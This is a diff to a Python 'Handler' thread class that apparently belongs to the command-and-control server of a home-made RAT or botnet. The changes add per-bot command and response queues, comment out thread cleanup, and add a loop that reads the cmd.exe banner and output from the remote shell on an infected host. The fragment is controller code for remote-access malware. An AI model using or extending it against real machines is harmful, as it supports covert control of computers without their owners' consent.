@@ -26,6 +26,18 @@ class Handler(threading.Thread):
         self.info = [self.bot_id,self.ip,self.port]
         self.status = "ALIVE"
 
+        self.respQueue = queue.Queue()
+        self.cmdQueue = queue.Queue()
+        # self.agentList = agentList
+
+    # Look at advantages and disadvantages of using seperate queues for each handler. 
+    #   - They can be initialized in the class itself, rather than in the Server or Interpreter class
+    #   - Look at implementing all Agent functions within the Interpreter class. Consider the example 
+    #       and think about how shifting all of these functions will make a difference in cleanliness.
+    #       It will require the extensive use of queues to pass back information, as the Agent thread
+    #       will continually use it the catch and execute commands. Think, Josh. Think...
+
+
     def run(self):
 
         # Returns 'Thread-#': Useful for specific interaction?
@@ -56,11 +68,11 @@ class Handler(threading.Thread):
 
         # Record information into deadConnections[]
         # deadConnections.append(self.info)             # Append the info so the thread can join the main thread
-        agentList.remove(self)                          # Remove the Handler-thread from the Alives array
+        # agentList.remove(self)                          # Remove the Handler-thread from the Alives array
 
         print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
-        if(threading.current_thread().is_alive()):
-            threading.current_thread().join
+        # if(threading.current_thread().is_alive()):
+        #     threading.current_thread().join
 
 
     def getStatus(self):
@@ -107,11 +119,24 @@ class Handler(threading.Thread):
             print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
             return False                            # unsuccessful
         else:
-            recvVal = self.client.recv(2048)        # Receive reply from RAT
-            print(recvVal)
-            #recvVal = self.client.recv(2048))      # Second here because only the Microsoft banner was being sent. 
-                                                    # Adding this captures the CWD prompt
-            #print(recvVal)
+            # recvVal = self.client.recv(2048)        # Receive reply from RAT
+            # print(recvVal)
+
+            # Banner grabbing for cmd.exe - cred to dtrizna
+            banner = ""
+            while True:
+                try:
+                    self.client.settimeout(1)
+                    recv = self.client.recv(4096).decode('utf-8')
+                except:
+                    recv = ""
+                if not recv:
+                    break
+                else:
+                    banner += recv
+            if banner:
+                print(banner)
+            time.sleep(0.5)
 
         while (True):                                                           # Capture IO sent over socket (cmd.exe)
             try:
@@ -181,6 +206,7 @@ class Handler(threading.Thread):
         # Ping host 
         #   if no reply, Kill host connection
         #
+        print("ping")
         # beacon rat
         #   if no reply, set host status to LOST
 
